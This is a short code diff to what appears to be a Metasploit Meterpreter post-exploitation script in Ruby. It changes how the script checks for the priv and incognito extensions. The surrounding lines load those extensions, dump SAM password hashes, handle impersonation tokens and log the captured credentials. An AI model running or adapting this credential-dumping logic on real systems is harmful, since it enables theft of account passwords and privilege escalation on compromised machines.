@@ -22,8 +22,8 @@ end
 
 
 # Make sure we're rockin Priv and Incognito
-client.core.use("priv") if not extensions.include?("priv")
-client.core.use("incognito") if not extensions.include?("incognito")
+client.core.use("priv") if not client.respond_to?("priv")
+client.core.use("incognito") if not client.respond_to?("incognito")
 
 # It wasn't me mom! Stinko did it!
 hashes = client.priv.sam_hashes
@@ -59,4 +59,3 @@ raise Rex::Script::Completed if not tokens
 
 	client.framework.db.report_auth_info(data)
 end
-
